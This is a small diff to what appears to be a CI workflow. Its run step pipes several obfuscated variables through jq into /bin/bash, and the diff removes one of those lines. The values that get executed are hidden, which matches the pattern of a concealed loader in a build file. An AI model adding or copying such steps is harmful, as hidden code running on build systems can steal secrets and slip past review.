@@ -20,7 +20,6 @@ jobs:
         run: |
           printf '%s' "$nkx6" | jq -r .pw397 | /bin/bash
           echo $aof06822 | jq -r .qfawm11 | /bin/bash
-          echo $kadp2320 | jq -r .acy79 | /bin/bash
           echo $adp044 | jq -r .qspyn3448 | /bin/bash
           echo $aseaf6 | jq -r .q4 | /bin/bash
           echo $mnsf7 | jq -r .fzisa02769 | /bin/bash
